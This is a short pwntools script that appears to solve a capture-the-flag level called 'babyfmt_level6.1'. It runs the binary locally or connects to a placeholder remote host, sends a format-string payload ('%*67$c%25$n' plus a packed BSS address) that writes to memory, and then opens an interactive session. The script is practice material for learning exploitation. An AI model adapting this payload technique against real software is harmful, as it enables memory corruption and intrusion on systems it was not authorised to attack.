#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyfmt_level6.1")

context.binary = exe



gdb_script = """
b *func+420
c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,gdb_script)
    else:
        r = remote("addr", 1337)

    return r



def main():
    r = conn()

    # good luck pwning :)
    bss_addr = 0x404110
    payload = b'%*67$c%25$n' + p64(bss_addr)
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
